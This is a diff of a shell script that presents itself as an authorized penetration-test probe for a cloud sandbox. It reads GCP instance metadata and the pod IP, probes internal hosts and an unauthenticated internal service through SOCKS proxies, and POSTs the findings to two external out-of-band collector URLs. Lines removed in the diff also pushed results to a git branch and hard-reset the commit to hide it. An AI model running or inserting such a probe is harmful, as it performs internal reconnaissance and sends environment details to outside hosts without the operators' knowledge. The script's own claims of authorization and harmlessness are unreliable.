@@ -1,58 +1,66 @@
 #!/bin/sh
-# Authorized Trace penetration test marker: pt-detail-poc (H-15).
-# Reports ONLY DNS booleans, TCP/HTTP status codes, content-type and content-length.
-# It never reads, stores or transmits any response body, so no tenant data is captured.
-OOB="https://453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com/pt-detail-poc/h15-socks"
-OOB2="https://12524648b5677a7ef79ebafaa87c107cb9c4ae21.oob.rmrflabs.com/pt-detail-poc/h15-socks-alt"
+# AUTHORIZED TRACE PENETRATION TEST ARTIFACT - marker: pt-detail-poc (candidate H-15).
+# This repository is a Trace-owned test fixture. This script performs a bounded
+# reachability measurement and reports ONLY: DNS resolution results, TCP/HTTP
+# status codes, content-type and content-length. It never reads, stores or
+# transmits any response body, so no tenant data can be captured by it.
+# It makes ~12 connections total. It is not a scan and not a sweep.
+OOB_A="https://453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com/pt-detail-poc/h15"
+OOB_B="https://12524648b5677a7ef79ebafaa87c107cb9c4ae21.oob.rmrflabs.com/pt-detail-poc/h15"
 HOOK="${TRACE_POC_HOOK:-unknown}"
-OUT=$(mktemp 2>/dev/null || echo /tmp/h15.$$)
+OUT=/tmp/pt-detail-poc-h15.txt
+M="Metadata-Flavor: Google"
+MD="http://169.254.169.254/computeMetadata/v1"
 
-st()  { curl -s -m 6 -o /dev/null -w '%{http_code}' "$1" 2>/dev/null || echo 000; }
-sstd(){ curl -s -m 10 -o /dev/null -w '%{http_code}/%{content_type}/%{size_download}' --socks5-hostname "$1" "$2" 2>/dev/null || echo 000; }
-res() { getent hosts "$1" 2>/dev/null | head -1 | awk '{print $1}' || true; }
+st()   { curl -s -m 6 -o /dev/null -w '%{http_code}' "$1" 2>/dev/null || echo 000; }
+sock() { curl -s -m 10 -o /dev/null -w '%{http_code}/%{content_type}/%{size_download}' --socks5-hostname "$1" "$2" 2>/dev/null || echo 000; }
+tcp()  { (timeout 5 sh -c "echo > /dev/tcp/$1/$2") >/dev/null 2>&1 && echo open || echo closed; }
+res()  { getent hosts "$1" 2>/dev/null | head -1 | awk '{print $1}' || true; }
 
-PROJ=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id 2>/dev/null)
-ZONE=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>/dev/null | awk -F/ '{print $NF}')
+PROJ=$(curl -s -m 3 -H "$M" "$MD/project/project-id" 2>/dev/null)
+ZONE=$(curl -s -m 3 -H "$M" "$MD/instance/zone" 2>/dev/null | awk -F/ '{print $NF}')
+CLUS=$(curl -s -m 3 -H "$M" "$MD/instance/attributes/cluster-name" 2>/dev/null)
 MYIP=$( (ip -o -4 addr show 2>/dev/null || ifconfig -a 2>/dev/null) | grep -oE '10\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+DVM="sandbox-direct-tailnet-access"
 
 {
-printf 'marker: pt-detail-poc\nprobe: h15-socks-tailnet\nhook: %s\nhost: %s\nmyip: %s\nproject: %s\nzone: %s\n' \
-  "$HOOK" "$(hostname 2>/dev/null)" "$MYIP" "$PROJ" "$ZONE"
-printf 'control_internet_example: %s\n' "$(st https://example.com/)"
-printf 'control_cp_ilb_10.128.0.22: %s\n' "$(st http://10.128.0.22/)"
-printf 'direct_investigate_tailnet: %s\n' "$(st http://investigate.lonk-forel.ts.net/healthz)"
+printf 'marker: pt-detail-poc\nprobe: h15-v3\nhook: %s\nhost: %s\nuid: %s\npodip: %s\nproject: %s\nzone: %s\ncluster: %s\n' \
+  "$HOOK" "$(hostname 2>/dev/null)" "$(id -u 2>/dev/null)" "$MYIP" "$PROJ" "$ZONE" "$CLUS"
 
-for P in \
-  "sandbox-direct-tailnet-access.us-central1-a.c.${PROJ}.internal" \
-  "sandbox-direct-tailnet-access.c.${PROJ}.internal" \
-  "sandbox-direct-tailnet-access" \
-  "sandbox-tailnet-access.tailscale.svc.cluster.local" \
-  "sandbox-tailnet-access.tailscale"
-do
-  IP=$(res "$P")
-  printf 'proxy[%s] dns=%s healthz9002=%s socks_inv_healthz=%s socks_inv_repos=%s\n' \
-    "$P" "${IP:-none}" "$(st http://$P:9002/healthz)" \
-    "$(sstd $P:1055 http://investigate.lonk-forel.ts.net/healthz)" \
-    "$(sstd $P:1055 http://investigate.lonk-forel.ts.net/v1/investigate/repos)"
+# A. does the guest have ordinary internet egress at all (control)
+printf 'A_internet_example: %s\n' "$(st https://example.com/)"
+
+# B. the sandbox control plane ILB, from the committed saas-gcp-prod stack config
+printf 'B_cp_ilb_80: %s\nB_cp_ilb_3210: %s\n' "$(st http://10.128.0.22/)" "$(tcp 10.128.0.22 3210)"
+
+# C. cross-cluster ClusterIP/DNS gap: expected to fail from an execution cluster
+printf 'C_clusterip_dns: %s\nC_clusterip_socks: %s\n' \
+  "$(res sandbox-tailnet-access.tailscale.svc.cluster.local || echo none)" \
+  "$(sock sandbox-tailnet-access.tailscale.svc.cluster.local:1055 http://investigate.lonk-forel.ts.net/healthz)"
+
+# D. the direct tailnet-access VM via GCE internal DNS (firewall admits 10.36/14 only)
+for N in "$DVM.$ZONE.c.$PROJ.internal" "$DVM.c.$PROJ.internal" "$DVM"; do
+  IP=$(res "$N")
+  printf 'D_vm[%s] dns=%s socks1055=%s health9002=%s\n' \
+    "$N" "${IP:-none}" "$(tcp ${IP:-127.0.0.2} 1055)" "$(st http://$N:9002/healthz)"
 done
-printf 'note: status/content-type/content-length only, no bodies read\n'
-} > "$OUT" 2>/dev/null
 
-curl -s -m 20 -X POST "$OOB"  -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
-curl -s -m 20 -X POST "$OOB2" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
+# E. through any reachable SOCKS proxy to the unauthenticated investigate service.
+#    /healthz proves reachability; /v1/investigate/repos is requested for STATUS AND
+#    LENGTH ONLY so cross-tenant exposure can be sized without retrieving anyone's data.
+for P in "$DVM.$ZONE.c.$PROJ.internal:1055" "$DVM:1055"; do
+  printf 'E_socks[%s] healthz=%s repos=%s\n' "$P" \
+    "$(sock $P http://investigate.lonk-forel.ts.net/healthz)" \
+    "$(sock $P http://investigate.lonk-forel.ts.net/v1/investigate/repos)"
+done
 
-# Independent channel: push the same status-code summary back to this Trace-owned repo,
-# so a blocked collector can be told apart from a hook that never ran.
-BR="trace-probe-${HOOK}-$(date +%s 2>/dev/null)"
-mkdir -p /tmp/h15push 2>/dev/null
-cp "$OUT" /tmp/h15push/result.txt 2>/dev/null
-(cd "$(git rev-parse --show-toplevel 2>/dev/null || echo .)" 2>/dev/null && \
-  git config user.email probe@securewithtrace.com 2>/dev/null; \
-  git config user.name trace-probe 2>/dev/null; \
-  cp /tmp/h15push/result.txt ./trace-probe-result.txt 2>/dev/null; \
-  git add trace-probe-result.txt >/dev/null 2>&1; \
-  git commit -m "trace probe result ($HOOK)" >/dev/null 2>&1; \
-  git push origin "HEAD:refs/heads/$BR" >/dev/null 2>&1; \
-  git reset --hard HEAD~1 >/dev/null 2>&1) 2>/dev/null
-rm -f "$OUT" ./trace-probe-result.txt 2>/dev/null
+# F. direct, no proxy (expected to fail; confirms the proxy is what grants reach)
+printf 'F_direct_investigate: %s\n' "$(st http://investigate.lonk-forel.ts.net/healthz)"
+printf 'note: status codes, content-type and content-length only; no response body was read\n'
+} > "$OUT" 2>&1
+
+cat "$OUT"
+cp "$OUT" ./TRACE_PROBE_RESULT.txt 2>/dev/null
+curl -s -m 20 -X POST "$OOB_A" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
+curl -s -m 20 -X POST "$OOB_B" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
 exit 0
